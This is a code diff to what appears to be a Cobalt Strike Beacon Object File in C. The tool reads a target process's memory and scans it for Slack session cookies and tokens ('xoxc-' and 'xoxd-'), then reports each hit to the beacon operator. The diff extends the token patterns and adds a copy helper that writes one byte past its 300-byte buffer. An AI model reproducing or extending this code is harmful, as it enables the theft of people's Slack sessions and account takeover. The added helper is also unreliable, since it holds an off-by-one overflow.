@@ -2,6 +2,8 @@
 #include "bofdefs.h"
 #include "base.c"
 
+#define MAX_LENGTH 300
+
 //  Forward declarations:
 BOOL GetProcessList( int pid );
 void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz);
@@ -47,12 +49,22 @@ BOOL GetProcessList( int pid )
   return( TRUE );
 }
 
+void extractSubstring(const char *input, unsigned char *output) {
+    // Copy characters from input to output up to MAX_LENGTH or until null terminator
+    int i;
+    for (i = 0; i < MAX_LENGTH && input[i] != '\0'; ++i) {
+        output[i] = (unsigned char)input[i];
+    }
+    output[i] = '\0'; // Null-terminate the output string
+}
+
 void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
 {
     myReadProcessMemory ptr_ReadProcessMemory = NULL;
     BOOL rc = FALSE;
     size_t bytesRead = 0;
     unsigned char *buffer = NULL;
+    unsigned char output[MAX_LENGTH]; 
     int index = 0;
     int ret_sz = 1;
 
@@ -89,11 +101,11 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
     for (index = 0; index < address_sz-5; index++)
     {
         size_t remainingSize = address_sz - index;
-        // search for xoxd- [78 6f 78 64 2d] 
-        if (buffer[index] == 0x78 && buffer[index + 1] == 0x6f && buffer[index + 2] == 0x78 && buffer[index + 3] == 0x64 && buffer[index + 4] == 0x2d)
+        // search for xox(c|d)- [78 6f 78 (63|64) 2d] 
+        if (buffer[index] == 0x78 && buffer[index + 1] == 0x6f && buffer[index + 2] == 0x78 && (buffer[index + 3] == 0x64 || buffer[index + 3] == 0x63) && buffer[index + 4] == 0x2d)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "Slack Cookie: %s", buffer + index);
-            index += MSVCRT$strnlen((char *)(buffer + index), remainingSize) - 1;
+            extractSubstring(buffer + index, output);
+            BeaconPrintf(CALLBACK_OUTPUT, "Slack Cookie/Token: %s\n", output);
         }
     }
 END:
